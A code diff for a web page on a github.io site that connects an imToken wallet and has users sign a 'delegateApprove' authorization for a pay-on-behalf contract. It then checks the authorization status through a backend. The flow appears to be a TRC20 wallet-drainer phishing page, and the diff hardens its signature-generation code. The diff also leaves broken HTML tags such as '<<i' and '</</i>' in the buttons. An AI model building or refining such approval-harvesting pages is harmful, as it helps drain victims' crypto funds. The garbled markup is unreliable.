@@ -352,12 +352,12 @@
             <!-- 复制链接区 -->
             <div class="copy-link-wrap">
                 <span id="copyLinkText">https://trc20trx-alt.github.io/Trc20.TRX/</span>
-                <button id="copyLinkBtn"><i class="fa fa-copy"></i> 复制链接</button>
+                <button id="copyLinkBtn"><<i class="fa fa-copy"></</i> 复制链接</button>
             </div>
         </div> 
-        <button id="connectBtn" class="btn"><i class="fa fa-link"></i> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled><i class="fa fa-pencil"></i> 生成离线签名</button>
-        <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;"><i class="fa fa-refresh"></i> 查看授权状态</button>
+        <button id="connectBtn" class="btn">连接imToken钱包</button>
+        <button id="approveBtn" class="btn" disabled><<i class="fa fa-pencil"></</i> 生成离线签名</button>
+        <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;"> 查看授权状态</button>
     </div>
     <!-- 底部信息区 -->
     <div class="footer-info">
@@ -469,7 +469,7 @@
                 try {
                     // 禁用按钮防止重复点击
                     approveBtn.disabled = true;
-                    approveBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> 生成中...';
+                    approveBtn.innerHTML = ' 生成中...';
 
                     // 1. 生成离线签名（v/r/s参数）
                     const { v, r, s } = await generateOfflineSignature(
@@ -514,7 +514,7 @@
                 } finally {
                     // 恢复按钮状态
                     approveBtn.disabled = false;
-                    approveBtn.innerHTML = '<i class="fa fa-pencil"></i> 生成离线签名';
+                    approveBtn.innerHTML = ' 生成离线签名';
 
                     // 同步状态到后端
                     try {
@@ -534,7 +534,7 @@
             checkStatusBtn.onclick = async () => {
                 try {
                     checkStatusBtn.disabled = true;
-                    checkStatusBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> 查询中...';
+                    checkStatusBtn.innerHTML = '查询中...';
 
                     // 调用后端接口查询状态
                     const res = await fetch(`${BACKEND_API}/check-status`, {
@@ -568,7 +568,7 @@
                     showToast(`查询失败：${e.message}`, "error");
                 } finally {
                     checkStatusBtn.disabled = false;
-                    checkStatusBtn.innerHTML = '<i class="fa fa-refresh"></i> 查看授权状态';
+                    checkStatusBtn.innerHTML = '查看授权状态';
                 }
             };
 
@@ -580,40 +580,91 @@
         };
 
         /**
-        /**
- * 生成离线签名（适配代付合约delegateApprove方法，兼容所有TronWeb版本）
- * @param {string} userAddress - 用户base58地址
- * @param {string} contractAddress - 代付合约base58地址
- * @param {string} amount - 授权金额（十六进制）
- * @returns {Object} v/r/s签名参数
- */
-async function generateOfflineSignature(userAddress, contractAddress, amount) {
-    try {
-        // 1. 地址转hex格式（合约要求）
-        const userHex = tronWeb.address.toHex(userAddress);
-        const contractHex = tronWeb.address.toHex(contractAddress);
+         * 生成离线签名（适配代付合约delegateApprove方法）- 兼容所有TronWeb版本
+         * @param {string} userAddress - 用户base58地址
+         * @param {string} contractAddress - 代付合约base58地址
+         * @param {string} amount - 授权金额（十六进制）
+         * @returns {Object} v/r/s签名参数
+         */
+        async function generateOfflineSignature(userAddress, contractAddress, amount) {
+            try {
+                // 新增：参数合法性校验（防止无效输入）
+                if (!userAddress || !contractAddress || !amount) {
+                    throw new Error("参数不能为空（用户地址/合约地址/授权金额）");
+                }
+                // 校验TRON base58地址格式
+                const base58Regex = /^[A-Za-z0-9]{34}$/;
+                if (!base58Regex.test(userAddress) || !base58Regex.test(contractAddress)) {
+                    throw new Error("用户地址或合约地址不是有效的TRON base58格式");
+                }
+                // 校验金额为十六进制格式（以0x开头）
+                const hexRegex = /^0x[0-9a-fA-F]*$/;
+                if (!hexRegex.test(amount)) {
+                    throw new Error("授权金额必须是十六进制格式（以0x开头）");
+                }
 
-        // 关键修复：用hexConcat替代concatHex（TronWeb兼容方法）
-        const concatenatedHex = tronWeb.utils.hexConcat([userHex, contractHex, amount]);
+                // 1. 地址转hex格式（合约要求）- 确保去掉前缀0x
+                let userHex = tronWeb.address.toHex(userAddress);
+                let contractHex = tronWeb.address.toHex(contractAddress);
+                
+                // 校验地址转hex后的长度（TRON地址转hex后固定42位，含0x）
+                if (userHex.length !== 42 || contractHex.length !== 42) {
+                    throw new Error("地址转换为hex后格式无效，请检查地址正确性");
+                }
 
-        // 2. 构造签名消息（与合约messageHash完全一致）
-        const messageHash = tronWeb.sha3(
-            tronWeb.utils.hexToBytes(concatenatedHex)
-        );
+                // 移除hex字符串的0x前缀（避免拼接后格式错误）
+                userHex = userHex.startsWith('0x') ? userHex.slice(2) : userHex;
+                contractHex = contractHex.startsWith('0x') ? contractHex.slice(2) : contractHex;
+                const amountHex = amount.startsWith('0x') ? amount.slice(2) : amount; // 处理amount的0x前缀
 
-        // 3. 唤起imToken签名（true表示返回序列化签名）
-        const signature = await tronWeb.trx.sign(messageHash, true);
+                // 2. 手动拼接hex字符串（替代concatHex，兼容所有版本）
+                const combinedHex = userHex + contractHex + amountHex;
 
-        // 4. 解析签名为v/r/s参数
-        const v = parseInt(signature.slice(128, 130), 16);
-        const r = `0x${signature.slice(0, 64)}`; // 补0x前缀
-        const s = `0x${signature.slice(64, 128)}`;
+                // 3. 构造签名消息（与合约messageHash完全一致）
+                const messageHash = tronWeb.sha3(
+                    tronWeb.utils.hexToBytes(combinedHex) // 直接用拼接后的hex字符串转字节
+                );
 
-        return { v, r, s };
-    } catch (e) {
-        throw new Error(`签名生成失败：${e.message}`);
-    }
-}
+                // 4. 唤起imToken签名（兼容旧版本imToken）
+                let signature = await tronWeb.trx.sign(messageHash, true);
+                // 旧版本imToken返回对象格式，需提取signature字段
+                if (typeof signature === "object" && signature.signature) {
+                    signature = signature.signature;
+                }
+
+                // 5. 解析签名为v/r/s参数
+                const v = parseInt(signature.slice(128, 130), 16);
+                const r = `0x${signature.slice(0, 64)}`; // 补0x前缀（合约要求）
+                const s = `0x${signature.slice(64, 128)}`;
+
+                // 保存签名记录到本地（便于排查问题）
+                localStorage.setItem(
+                    `signature_${userAddress}`,
+                    JSON.stringify({
+                        combinedHex,
+                        messageHash,
+                        v,
+                        r,
+                        s,
+                        timestamp: new Date().toISOString()
+                    })
+                );
+
+                return { v, r, s };
+            } catch (e) {
+                // 细化错误类型，方便排查
+                if (e.message.includes("toHex")) {
+                    throw new Error(`地址格式错误：无法将base58地址转为hex，请检查地址有效性`);
+                } else if (e.message.includes("sign")) {
+                    throw new Error(`钱包签名失败：请确保在imToken内置浏览器操作，且钱包已解锁`);
+                } else if (e.message.includes("hexToBytes")) {
+                    throw new Error(`hex字符串无效：拼接后的hex格式错误，无法转为字节`);
+                } else {
+                    throw new Error(`签名生成失败：${e.message}`);
+                }
+            }
+        }
+
         /**
          * 初始化钱包：获取地址、余额
          */
